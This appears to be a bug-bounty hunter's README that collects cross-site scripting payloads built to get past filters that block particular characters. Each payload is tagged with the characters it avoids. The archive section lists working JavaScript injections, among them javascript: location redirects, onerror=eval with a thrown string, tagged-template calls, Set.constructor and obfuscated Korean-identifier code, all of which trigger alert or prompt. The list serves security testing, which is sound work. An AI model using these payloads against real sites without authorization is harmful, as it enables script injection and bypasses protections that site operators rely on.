What is XSS Payload without Anything
When I work for a company or bug bounty, the unexpected hurdle is a protection(xss filter) of special char in the JS(Javascript) area. So I am devising a way to easily solve these problems, and one of the processes is this document.

Let's collect a lot of thoughts and solve our problems.

Concept
It is similar to "Payload all the things" in terms of collecting the payload, but I want to provide a list of payloads with special tag (without char, used char, other..) I plan to make it easy to search and to show what characters (or what they are made of) are unusable.

format
without char: () , '

XSS Payloads

without char (Frequently filtered characters)
I have selected special characters that are often blocked.

( ) 
{ } 
, 
"
'
`
[ ]
\ 
/ 
; 
+ 
. 
=


(template): () {} , " ' backtick [] \ / ; + . =

Usage
on Github.com

Awesome payload
coming soon

Archive

without char: () , " backtick \ / [] {} .
location='JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]
without char: () {} , " backtick [] / + .
onerror=eval;throw'alert\x2845\x29';
without char: !backtick
prompt`45`
without char: () {} , " backtick``[] / ; + .
location='javaScriPt:alert\x2845\x29'
without char: " backtick \ / ; .
([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()
without char: {} , " ' backtick \ / ; + =
[45].some.alert()
without char: () {} , " ' [] \ / ; + =
Set.constructor`alert\x2845\x29`


